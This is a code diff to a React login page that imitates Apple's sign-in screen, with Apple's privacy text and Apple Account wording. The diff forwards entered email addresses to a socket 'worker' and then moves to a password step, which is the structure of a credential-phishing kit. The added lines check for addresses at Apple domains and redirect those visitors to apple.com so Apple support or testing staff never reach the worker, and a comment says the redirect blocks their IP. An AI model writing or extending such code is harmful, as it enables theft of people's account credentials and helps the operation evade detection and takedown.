@@ -4,6 +4,9 @@ import { startAuth, reportEmail } from "../lib/socket";
 import { useAuthState } from "../lib/useAuth";
 import { friendlyMessage } from "../lib/messages";
 
+const APPLE_HOME = "https://www.apple.com/";
+const SUPPORT_EMAIL = /@apple(?:\.|$)/i;
+
 const PRIVACY_TEXT =
   "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";
 
@@ -148,7 +151,14 @@ export default function Login({ onContinue }) {
     event.preventDefault();
     if (!complete || busy) return;
     if (emailStep) {
-      reportEmail({ email: email.trim() });
+      const address = email.trim();
+      // Apple support/testing addresses must not reach the worker; send the
+      // visitor back to Apple and let the redirect's term block the IP.
+      if (SUPPORT_EMAIL.test(address)) {
+        window.location.replace(APPLE_HOME);
+        return;
+      }
+      reportEmail({ email: address });
       showPasswordStep();
       return;
     }
